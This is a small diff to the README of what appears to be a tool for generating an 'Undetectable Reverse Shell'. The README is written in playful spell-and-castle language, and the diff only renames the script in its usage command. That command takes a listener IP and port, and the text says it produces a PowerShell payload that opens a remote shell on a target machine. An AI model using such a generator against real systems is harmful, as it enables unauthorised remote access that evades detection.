@@ -40,7 +40,7 @@ To master this spell, follow these simple guidelines.
 Invoke the Undetectable Reverse Shell by specifying the coordinates of the receiving castle's magical portal (IP address) and the secret passageway (port).
 
 ```python
-python generador3.py --ip 192.168.1.2 --port 8080
+python generador.py --ip 192.168.1.2 --port 8080
 ```
 
 This will conjure a PowerShell chant, which can be whispered into the ears of the target castle's gatekeeper to open the secret passageway.
